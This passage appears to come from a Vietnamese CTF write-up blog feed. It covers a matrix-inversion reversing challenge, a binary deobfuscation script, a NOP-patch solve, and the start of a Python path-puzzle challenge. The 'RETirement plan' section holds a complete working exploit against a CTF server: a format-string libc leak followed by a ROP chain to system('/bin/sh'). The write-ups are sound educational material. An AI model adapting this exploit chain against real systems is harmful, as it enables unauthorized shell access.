+</code></pre><p>Mình đọc đoạn mã này trong text lại khá là dài và cũng không hiểu rõ nó làm gì. Nhờ gợi ý của mọi người nên mình thử một vài input đặc biệt rồi debug, cuối cùng mình đoán được đây là một đoạn mã thực hiện việc nhân ma trận được tạo từ input và 1 ma trận được chương trình tạo sẵn.</p>
+<pre tabindex="0"><code>=&gt; 0x55555555c890:	mov    eax,DWORD PTR [rbp-0x284]  i  //loop 2
+=&gt; 0x55555555c8c0:	cmp    eax,DWORD PTR [rbp-0x280]  // j
+    → cmp operands: $eax = 0, DWORD PTR [rbp-0x280] = N/A // cmp j,i
+=&gt; 0x55555555c8f0:	jne    0x55555555caa5
+
+=&gt; 0x55555555c927:	movzx  edx,BYTE PTR [rbp-0x295]       edx=1(1)
+=&gt; 0x55555555c966:	mov    rax,QWORD PTR [rbp-0x278]    
+=&gt; 0x55555555c995:	cmp    rax,0x1                            
+    → cmp operands: $rax = -600, 0x1 = 1              cmp q(0x7fffffffda68),1
+=&gt; 0x55555555c9b7:	sete   al          // al=0
+=&gt; 0x55555555c9de:	movzx  eax,al
+=&gt; 0x55555555c9fe:	and    eax,edx         // eax=0
+=&gt; 0x55555555ca16:	test   eax,eax      
+=&gt; 0x55555555ca35:	setne  al         // al=1
+=&gt; 0x55555555ca5f:	mov    BYTE PTR [rbp-0x295],al ///   BYTE PTR [rbp-0x295] =1
+=&gt; 0x55555555ca8d:	jmp    0x55555555cc1f
+=&gt; 0x55555555cc3b:	add    DWORD PTR [rbp-0x280],0x1               // counter DWORD PTR [rbp-0x280]
+=&gt; 0x55555555cc7a:	cmp    DWORD PTR [rbp-0x280],0x3
+    → cmp operands: DWORD PTR [rbp-0x280] = N/A, 0x3 = 3
+=&gt; 0x55555555ccb2:	jle    0x55555555c6fd
+
+
+=&gt; 0x55555555c712:	mov    eax,DWORD PTR [rbp-0x280] 
+=&gt; 0x55555555c73f:	movsxd rdx,eax                 //rdx=j
+=&gt; 0x55555555c769:	mov    eax,DWORD PTR [rbp-0x284]
+=&gt; 0x55555555c796:	movsxd rsi,eax            //rsi =i
+=&gt; 0x55555555c7c7:	lea    rcx,[rbp-0x278]        // rcx=0
+=&gt; 0x55555555c806:	lea    rax,[rbp-0x230]        // rax=4; rbp-0x230=4
+=&gt; 0x55555555c83b:	mov    rdi,rax                 //rdi=4
+=&gt; 0x55555555c863:	call   0x555555555ca0
+=&gt; 0x555555555cac:	endbr64                                                     
+=&gt; 0x555555555cc5:	push   rbp
+=&gt; 0x555555555ce1:	mov    rbp,rsp
+=&gt; 0x555555555d02:	sub    rsp,0x30
+=&gt; 0x555555555d1e:	mov    QWORD PTR [rbp-0x18],rdi //4
+=&gt; 0x555555555d3a:	mov    QWORD PTR [rbp-0x20],rsi // i
+=&gt; 0x555555555d56:	mov    QWORD PTR [rbp-0x28],rdx // j
+=&gt; 0x555555555d72:	mov    QWORD PTR [rbp-0x30],rcx //0
+=&gt; 0x555555555d8e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555db0:	mov    rax,QWORD PTR [rax]   // rax=4
+=&gt; 0x555555555dd1:	cmp    QWORD PTR [rbp-0x20],rax 
+    → cmp operands: [rbp-0x20] = N/A, $rax = 4
+=&gt; 0x555555555df6:	jb     0x555555555e63
+=&gt; 0x555555555e6f:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555e8b:	mov    rax,QWORD PTR [rax+0x8] // rax=4
+=&gt; 0x555555555ea7:	cmp    QWORD PTR [rbp-0x28],rax /// cmp counter, 4
+    → cmp operands: [rbp-0x28] = N/A, $rax = 4
+=&gt; 0x555555555ecc:	jb     0x555555555f39
+=&gt; 0x555555555f45:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x555555555f61:	mov    rax,QWORD PTR [rax+0x8]    //rax=4
+=&gt; 0x555555555f84:	imul   rax,QWORD PTR [rbp-0x20] 
+=&gt; 0x555555555fae:	mov    rdx,rax                    // rdx=4*i
+=&gt; 0x555555555fcf:	mov    rax,QWORD PTR [rbp-0x28]
+=&gt; 0x555555555ff1:	add    rax,rdx                         // rax=4*i+j
+=&gt; 0x555555556012:	mov    QWORD PTR [rbp-0x8],rax   // QWORD PTR [rbp-0x8]=4*i+j= k
+=&gt; 0x55555555602e:	mov    rax,QWORD PTR [rbp-0x18]
+=&gt; 0x55555555604a:	mov    rdx,QWORD PTR [rax+0x10]  
+=&gt; 0x555555556066:	mov    rax,QWORD PTR [rbp-0x8]
+=&gt; 0x555555556082:	shl    rax,0x3                     
+=&gt; 0x5555555560a4:	add    rax,rdx                  
+=&gt; 0x5555555560cb:	mov    rdx,QWORD PTR [rax]       
+=&gt; 0x5555555560ec:	mov    rax,QWORD PTR [rbp-0x30] 
+=&gt; 0x55555555610e:	mov    QWORD PTR [rax],rdx      
+=&gt; 0x555555556136:	mov    eax,0x1
+=&gt; 0x555555556157:	leave
+=&gt; 0x555555556161:	ret
+......
+</code></pre><p>Đọc tiếp trong file log.txt, chương trình sau khi nhân ma trận sẽ xử lý duyệt qua trận trận thu được và kiểm tra xem liệu với các giá trị có index hàng bằng index cột thì có bằng 1 hay không, với các giá trị còn lại có bằng 0 hay không. Nói cách khác, chương trình so sánh ma trận thu được sau phép nhân với ma trận đơn vị. Mình rút gọn lại logic của đoạn này như sau:</p>
+<pre tabindex="0"><code>
+=&gt; 0x55555555c8f0:	jne    0x55555555caa5
+ZF=0   {
+=&gt; 0x55555555cac1:	movzx  edx,BYTE PTR [rbp-0x295]
+=&gt; 0x55555555cb00:	mov    rax,QWORD PTR [rbp-0x278]
+=&gt; 0x55555555cb35:	test   rax,rax
+=&gt; 0x55555555cb5c:	sete   al
+=&gt; 0x55555555cb83:	movzx  eax,al
+=&gt; 0x55555555cba3:	and    eax,edx
+=&gt; 0x55555555cbbb:	test   eax,eax
+=&gt; 0x55555555cbda:	setne  al
+=&gt; 0x55555555cc04:	mov    BYTE PTR [rbp-0x295],al  
+										}
+}
+
+ZF !=0 {
+=&gt; 0x55555555c927:	movzx  edx,BYTE PTR [rbp-0x295]       
+=&gt; 0x55555555c966:	mov    rax,QWORD PTR [rbp-0x278]    
+=&gt; 0x55555555c995:	cmp    rax,0x1                            
+    → cmp operands: $rax = -600, 0x1 = 1             
+=&gt; 0x55555555c9b7:	sete   al          // al=0
+=&gt; 0x55555555c9de:	movzx  eax,al
+=&gt; 0x55555555c9fe:	and    eax,edx         // eax=0
+=&gt; 0x55555555ca16:	test   eax,eax      
+=&gt; 0x55555555ca35:	setne  al         // al=1
+=&gt; 0x55555555ca5f:	mov    BYTE PTR [rbp-0x295],al ///   BYTE PTR [rbp-0x295] =1
+}
+</code></pre><p>Đến lúc này, chúng ta đã nhìn ra vấn đề: Input của chúng ta sẽ được xử lý bỏ ký tự &lsquo;-&rsquo;, thực hiện biến đổi như trên rồi tải vào ma trận, nhân ma trận với một ma trận cho sẵn rồi so sánh với ma trận đơn vị. Việc cuối cùng mình cần làm là tìm ma trận cho sẵn. Debug lại và dễ dàng tìm được ma trận được chương trình tạo sẵn để nhân:</p>
+<p></p>
+<p>Như vậy input phải thỏa mãn là ma trận nghịch đảo của ma trận này. Mình tìm ma trận nghịch đảo, truy ngược về password và nhập lại thì mình tìm được flag.</p>
+<p></p>
+<h3 id="3-script">3. Script</h3>
+<pre tabindex="0"><code>import numpy as np
+
+A = np.array([
+    [88, -17, 19, -57],
+    [45, -9, 10, -29],
+    [-56, 11, -12, 36],
+    [-40, 8, -9, 26]
+])
+
+
+A_inv = np.linalg.inv(A)
+
+
+res_rows = []
+for i, row in enumerate(A_inv):
+    row_chars = []
+    for j, val in enumerate(row):
+        ascii_code = int(round(val + i * j + 0x41))
+        row_chars.append(chr(ascii_code))
+    res_rows.append(&#39;&#39;.join(row_chars))
+res = &#39;-&#39;.join(res_rows)
+
+print(res)
+</code></pre><h3 id="4-another-approach">4. Another approach</h3>
+<p>Sau khi mình đọc writeup chính thức, có vẻ như có hẳn một script để deobfuscating file này, và dùng IDA decompile được luôn :(. Việc này sẽ giúp công việc phân tích dễ hơn rất nhiều lần ( so với ngồi đọc full asm như mình ). Mình sẽ để script bên dưới cho mọi người dùng ( hy vọng mọi người dùng nó thay vì cố đọc hết code asm sinh ra từ script trên kia). Còn lại logic của chương trình về cơ bản vấn giống bên trên mình đã trình bày.</p>
+<pre tabindex="0"><code>from pwn import *
+import capstone
+import sys
+import ctypes
+
+def xor(a, b):
+    return bytes([a ^ b for a, b in zip(a, b)])
+
+def disas_single(data):
+    disas = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
+    inst = next(disas.disasm(data, 0))
+    return inst, inst.size, inst.mnemonic
+
+def deobufscate(elf, code, text_off, text_end, addr, modified):
+    stop = False
+    while not stop:
+        inst, sz, mneumonic = disas_single(code[addr:])
+        if mneumonic == &#39;ret&#39;:
+            stop = True
+        elif mneumonic == &#39;call&#39;:
+            call_dst = addr + ctypes.c_int64(int(inst.op_str, 16)).value
+            if call_dst &gt;= text_off and call_dst &lt;= text_end:
+                deobufscate(elf, code, text_off, text_end, call_dst, modified)
+        elif mneumonic == &#39;xor&#39;:
+            if &#39;[rip + &#39; in inst.op_str:
+                rip_rel = int(inst.op_str.split(&#39;[rip + &#39;)[1].split(&#39;]&#39;)[0], 16)
+                key = int(inst.op_str.split(&#39;,&#39;)[1], 16)
+                decrypt = b&#39;&#39;
+                if inst.op_str.startswith(&#39;qword ptr &#39;):
+                    decrypt = xor(p64(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 8])
+                elif inst.op_str.startswith(&#39;dword ptr &#39;):
+                    decrypt = xor(p32(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 4])
+                elif inst.op_str.startswith(&#39;word ptr &#39;):
+                    decrypt = xor(p16(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 2])
+                elif inst.op_str.startswith(&#39;byte ptr &#39;):
+                    decrypt = xor(p8(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 1])
+                assert(len(decrypt) in [1, 2, 4, 8])
+                for i, b in enumerate(decrypt):
+                    modified[addr + sz + rip_rel + i] = b
+                for i in range(addr, addr + sz):
+                    modified[i] = 0x90
+                if code[addr - 0x1] == 0x9c:
+                    modified[addr - 0x1] = 0x90
+                if code[addr + sz] == 0x9d:
+                    modified[addr + sz] = 0x90
+            elif &#39;[rip -&#39; in inst.op_str:
+                for i in range(addr, addr + sz):
+                    modified[i] = 0x90
+                if code[addr - 0x1] == 0x9c:
+                    modified[addr - 0x1] = 0x90
+                if code[addr + sz] == 0x9d:
+                    modified[addr + sz] = 0x90
+            code = bytes(modified)
+        addr += sz
+
+
+if __name__ == &#39;__main__&#39;:
+    if len(sys.argv) != 3:
+        print(f&#39;{sys.argv[0]} obfuscated main_offset&#39;)
+        exit(1)
+    elf = ELF(sys.argv[1])
+    main = int(sys.argv[2], 16)
+    text_off = elf.get_section_by_name(&#39;.text&#39;).header.sh_offset
+    text_end = elf.get_section_by_name(&#39;.text&#39;).header.sh_offset + elf.get_section_by_name(&#39;.text&#39;).header.sh_size
+    sz = text_off + text_end
+    with open(elf.path, &#39;rb&#39;) as f:
+        full = f.read()
+    data = full[:sz]
+    modified = bytearray(data)
+    deobufscate(elf, data, text_off, text_end, main, modified)
+    with open(f&#39;{elf.path}_deobfuscate&#39;, &#39;wb&#39;) as f:
+        f.write(bytes(modified) + full[sz:])
+</code></pre>]]></description>
+</item>
+<item>
+    <title>UTCTF 2025</title>
+    <link>https://cr0nica1.github.io/posts/utctf/</link>
+    <pubDate>Wed, 16 Apr 2025 03:03:35 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/utctf/</guid>
+    <description><![CDATA[<p>Giải này mình tham gia song song với K!nd4SUS CTF 2025 nên không có giải được nhiều. Tuy nhiên mình vẫn có 1 chall dễ rev và 1 chall pwn.</p>
+<h2 id="ostrich-algorithm---reverse-engineering">Ostrich Algorithm - reverse engineering</h2>
+<h3 id="1-analysis">1. Analysis</h3>
+<p>Sử dụng IDA pro mở file thì ở hàm start mình nhìn thấy được đoạn mã giả như sau:</p>
+<p></p>
+<p>Do chương trình này Statically linked, cộng với các tham số truyền vào hàm sub_404000 nên mình đoán có vẻ đây là 1 hàm giống _libc_start_main. Đọc kỹ hơn bên trong thì mình gần như chắc chắn điều đó, do vậy có vẻ hàm Sub_401775 sẽ là hàm main.</p>
+<p></p>
+<p>Bên trong hàm sub_401775 mình thấy chương trình so sánh chuỗi &ldquo;welcome to UTCTF!&rdquo; và chuỗi &ldquo;oiiaoiiaoiiaoiia&rdquo;, nếu không giống nhau sẽ gọi sub_40c90. Kiểm tra bên trong hàm này cùng với thử đặt breakpoint tại đây khi debug, mình nhận ra hàm sub_401775 sẽ thoát chương trình. Như vậy chương trình sẽ luôn dừng ở đây. Do đó ý tưởng ban đầu là mình thử patch byte xem sao.</p>
+<h3 id="2-patch-byte">2. Patch byte</h3>
+<p>Mình patch toàn bộ lệnh gọi hàm sub_401775 bằng nop.</p>
+<p></p>
+<p>Thay toàn bộ byte ở đây thành 0x90.</p>
+<p></p>
+<p>Mình cho chạy thử chương trình ở đây và nhận được flag.</p>
+<p></p>
+<h2 id="retirement-plan---binary-exploitation">RETirement plan - binary exploitation</h2>
+<h3 id="1-vulnerability">1. Vulnerability</h3>
+<p></p>
+<p>Nhìn vào pseudocode, mình nhận thấy một lỗi bof ở hàm gets() và lỗi format string ở hàm printf.
+</p>
+<p>Checksec chương trình nhận thấy không có bất kỳ một mitigation nào, ngoại trừ Partial RELRO. Do đó chall này có rất nhiều phương án, phương án của mình trình bày ở đây là sử dụng ROP.</p>
+<h3 id="2-analysis">2. Analysis</h3>
+<p>Vòng lặp for ngay bên dưới hàm gets là một thuật toán xử lý để lọc các ký tự độc hại nhằm khai thác format string. Tuy nhiên thay vì kiểm tra string format, chương trình lại gán format vào con trỏ v5 và thực hiện rà soát string vào con trỏ v5. Không những vậy, vòng lặp sẽ chạy đến khi v5[i] có giá trị NULL. Như vậy ý tưởng của mình sẽ là ghi đè giá trị con trỏ v5 bằng 1 địa chỉ có quyền rw mà ở đấy toàn các giá trị NULL. Sau đó mình sẽ ghi đè ret_address bằng các gadget nhằm thực thi lại hàm main 1 lần nữa sau khi đã leak được địa chỉ libc trên qua format string.</p>
+<h3 id="3-exploitation">3. Exploitation</h3>
+<p>Payload đầu tiên của mình sẽ khai thác format string để leak giá trị trên stack, đồng thời ghi đè ret_address về hàm main 1 lần nữa. Trước tiên mình cần tìm 1 vùng nhớ có quyền rw mà toàn các giá trị NULL để gi đè v5.
+</p>
+<p></p>
+<p>vậy là đã có vùng nhớ ghi đè vào v5. Mình sẽ thử gửi payload xem chúng ta thu được gì.</p>
+<p></p>
+<p></p>
+<p>Check giá trị thu được, chúng ta biết được rằng địa chỉ này là địa chỉ của hàm <em>IO_2_1_stdin</em> trong libc.</p>
+<p>việc còn lại khá là đơn giản, payload thứ 2 chúng ta chỉ cần ghi đè các gadget để thực thi system(/bin/sh) là xong.</p>
+<p></p>
+<p></p>
+<p>Kết nối vào máy remote ta thu được flag.</p>
+<p></p>
+<h3 id="4-script">4. Script</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./shellcode_patched&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>rw_section<span style="color:#f92672">=</span><span style="color:#ae81ff">0x601000</span>
+</span></span><span style="display:flex;"><span>main<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400616</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;challenge.utctf.live&#39;</span>,<span style="color:#ae81ff">9009</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;Insert prompt here&gt;: &#39;</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%3$p &#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x601200</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span>p64(main)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>libc_base<span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_2_1_stdin_&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Leak: </span><span style="color:#e6db74">{</span>hex(leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;libc base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]<span style="color:#f92672">+</span>libc_base
+</span></span><span style="display:flex;"><span>binsh<span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span>next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000400793</span>
+</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span>pop_rdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#ae81ff">0x30</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x601200</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(pop_rdi)<span style="color:#f92672">+</span>p64(binsh)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(ret)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span>p64(system)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;Insert prompt here&gt;: &#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></description>
+</item>
+<item>
+    <title>K!nd4SUS CTF 2025</title>
+    <link>https://cr0nica1.github.io/posts/intro/</link>
+    <pubDate>Wed, 16 Apr 2025 02:31:48 &#43;0700</pubDate>
+    <author>cr0nica1</author>
+    <guid>https://cr0nica1.github.io/posts/intro/</guid>
+    <description><![CDATA[<p>Đây là giải CTF đầu tiên của mình với CLB BKSEC, tuy vẫn chưa có nhiều kinh nghiệm nhưng mình cũng học hỏi khá nhiều điều từ 2 challenge mình giải được.</p>
+<h2 id="i-the-kindling-of-the-first-flag---reverse-engineering">I. The kindling of the first Flag - reverse engineering</h2>
+<h3 id="1-analysis">1. Analysis</h3>
+<p>Chall là một file python về một trò chơi tìm path thỏa mãn để chương trình in ra flag.</p>
+<pre tabindex="0"><code>import hashlib
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import os
+import base64
+import random
+
+FLAG = &#34;JlLScp2qTzfFZ7kIYP6Jm5Mv/2h6p26S0OWgmXYdEMAl1Sjg6hwW95bPsZdtiggvHVVv8zM+x7vRw2qOr3ORbw==&#34;
+RED = &#34;\033[0;31m&#34;
+PURPLE = &#34;\033[0;35m&#34;
+ITALIC = &#34;\033[3m&#34;
+BOLD = &#34;\033[1m&#34;
+UNDERLINE = &#34;\033[4m&#34;
+END = &#34;\033[0m&#34;
+
+# don&#39;t mind the crypto stuff
+class Cipher:
+    def encrypt(self, plainText, key):
+        iv = os.urandom(16) 
+        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest() 
+        cipher = AES.new(privateKey, AES.MODE_CBC, iv)
+        encryptedBytes = cipher.encrypt(pad(plainText.encode(), AES.block_size))  
+        return base64.b64encode(iv + encryptedBytes).decode()
+
+    def decrypt(self, encrypted, key):
+        encryptedData = base64.b64decode(encrypted) 
+        iv = encryptedData[:16] 
+        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest()  
+        cipher = AES.new(privateKey, AES.MODE_CBC, iv) 
+        try:
+            decryptedBytes = unpad(cipher.decrypt(encryptedData[16:]), AES.block_size)  
+        except:
+            die(1)
+        return decryptedBytes.decode()
+
+
+places = [&#34;Cemetery of Ash&#34;, &#34;Grand Archives&#34;, &#34;Profaned Capital&#34;, &#34;Farron Keep&#34;, &#34;Anor Londo&#34;, &#34;High Wall of Lothric&#34;, &#34;Undead Settlement&#34;, &#34;Firelink Shrine&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Lothric Castle&#34;, &#34;Cathedral of the Deep&#34;,&#34;Irithyll of the Boreal Valley&#34;,&#34;Untended Graves&#34;,&#34;Kiln of the First Flame&#34;]
+
+routes = [
+    [60, &#34;Firelink Shrine&#34;, &#34;Kiln of the First Flame&#34;, &#34;Undead Settlement&#34;, &#34;High Wall of Lothric&#34;],
+    [-10, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Untended Graves&#34;],
+    [12, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;, &#34;Undead Settlement&#34;, &#34;Kiln of the First Flame&#34;],
+    [-5555, &#34;Road of Sacrifices&#34;, &#34;Catacombs of Carthus&#34;, &#34;Anor Londo&#34;, &#34;Cathedral of the Deep&#34;],
+    [555, &#34;Irithyll of the Boreal Valley&#34;, &#34;Irithyll Dungeon&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;],
+    [3, &#34;Firelink Shrine&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;, &#34;Untended Graves&#34;],
+    [1015, &#34;High Wall of Lothric&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;],
+    [35, &#34;Kiln of the First Flame&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;, &#34;Irithyll of the Boreal Valley&#34;],
+    [143, &#34;Cathedral of the Deep&#34;, &#34;Farron Keep&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;],
+    [1551, &#34;Irithyll of the Boreal Valley&#34;, &#34;Profaned Capital&#34;, &#34;High Wall of Lothric&#34;, &#34;Farron Keep&#34;],
+    [70, &#34;Farron Keep&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Grand Archives&#34;, &#34;Firelink Shrine&#34;],
+    [77, &#34;High Wall of Lothric&#34;, &#34;Untended Graves&#34;, &#34;Grand Archives&#34;, &#34;Farron Keep&#34;],
+    [718640, &#34;Farron Keep&#34;, &#34;Road of Sacrifices&#34;, &#34;Profaned Capital&#34;, &#34;Anor Londo&#34;],
+    [869, &#34;Anor Londo&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Road of Sacrifices&#34;],
+    [6969, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Kiln of the First Flame&#34;, &#34;Cathedral of the Deep&#34;]
+]
+
+position = &#34;&#34;
+path = []
+
+def checkFlag():
+    global path
+    aes = Cipher()
+
+    a = &#34;&#34; 
+    b = &#34;&#34;
+    for p in path:
+        if path.index(p) % 2 == 0:
+            a += f&#34;{p[0]+p[-1]}&#34;
+        else:
+            b += f&#34;{p[0]+p[-1]}&#34;
+
+    key = a+b
+    attempt = aes.decrypt(FLAG,key)
+
+    if &#34;KSUS&#34; not in attempt:
+        die(1)
+    else:
+        print(f&#34;\nYou hear that sweet female voice again, this time clearer.\n{ITALIC}Well done, Unflagged...{END}, she muses as a torn piece of parchment manifests itself in front of you:&#34;)
+        print(f&#34;{PURPLE}{attempt}{END}&#34;)
+        exit()
+
+
+def printLocationDetails():
+    global position
+    print(f&#34;\nYou find yourself in a place called {PURPLE}{BOLD}{position.upper()}{END}.&#34;)
+    print(&#34;A number of dangerous paths, crawling with enemies, open in front of you... An infinite sea of possibilities.\nWhere will you go?\n&#34;)
+    for i,r in enumerate(routes[places.index(position)][1:]):
+        print(f&#34;\t{i}. {r}&#34;)
+
+
+def die(way):
+    quotes = [
+        f&#34;As you make your next step, you waste a second to glance at the bloodied path you are about to leave behind. \nOne second too long, as a blazing sword piercing right through you suddenly reminds you. \n{ITALIC}This spot marks our grave, but you may rest here too, if you would like...{END} a young prince whispers.&#34;,
+        f&#34;The earth trembles and you feel the sudden urge to look to the greyish sky above you.\n{ITALIC}Ignorant slaves, how quickly you forget{END}, a twisted dragon-man spits as he crushes you under his feet.&#34;,
+        f&#34;The deadly scythe of a woman grabs you by the waist.\n{ITALIC}Return from whence thou cam&#39;st. For that is thy place of belonging{END}, the Sister commands before taking you to your grave.&#34;,
+        f&#34;In the thick mist, a nun-like figure reveals herself in front of you.\n{ITALIC}Return Lord of Londor. You have your own subjects to attain to{END}, she whispers as she cuts right through you with her scythe.&#34;
+    ]
+    if way:
+        print(f&#34;\n{random.choice(quotes)}&#34;)
+    else:
+        print(f&#34;{ITALIC}What is taking you so long?{END}, Patches croons before kicking you off a cliff again.&#34;)
+
+    print(f&#34;\n\t{RED}YOU DIED{END}\n&#34;)
+    exit()
+
+
+def proceed(next):
+    global position
+    if sum([0, 0, 0, 1][routes[places.index(position)][0]:routes[places.index(position)][0]+1]) == 1:
+        if next &gt; ((221^216)&gt;&gt;True)*((len(&#34;...Rise, if you would...for that is our curse...&#34;)^53)&gt;&gt;1):
+            die(1)
+    elif sum(int(d) for d in str(abs(routes[places.index(position)][0]))) % 3 == 0:   
+        if next &gt; (int(bool(len(&#34;Why, Patches, why?&#34;)))):
+            die(1)
+    elif str(abs(routes[places.index(position)][0]))[-1] in &#34;05&#34;:  
+        if next &gt; (True &lt;&lt; True):
+            die(1)
+    elif (sum(int(str(routes[places.index(position)][0])[i]) for i in range(0, len(str(routes[places.index(position)][0])), 2)) - sum(int(str(routes[places.index(position)][0])[i]) for i in range(1, len(str(routes[places.index(position)][0])), 2))) % 11 == 0: 
+        if next &gt; (sum(map(int,str(111111)[::2]))):
+            die(1)
+
+    path.append(routes[places.index(position)][next])   
+    position = routes[places.index(position)][next]
+        
+
+def play():
+    global position
+    global path
+    while True:
+        if position != &#34;Kiln of the First Flame&#34; and len(path) &lt; 22: 
+            printLocationDetails() 
+            next = int(input(&#34;\nChoose a number &gt;   &#34;))
+            if next &lt; 0 or next &gt; 3:
+                exit()
+            proceed(next+1)
+        elif position == &#34;Kiln of the First Flame&#34;:   
+            checkFlag()
+        elif len(path) &gt;= 22:
+            die(0)
+
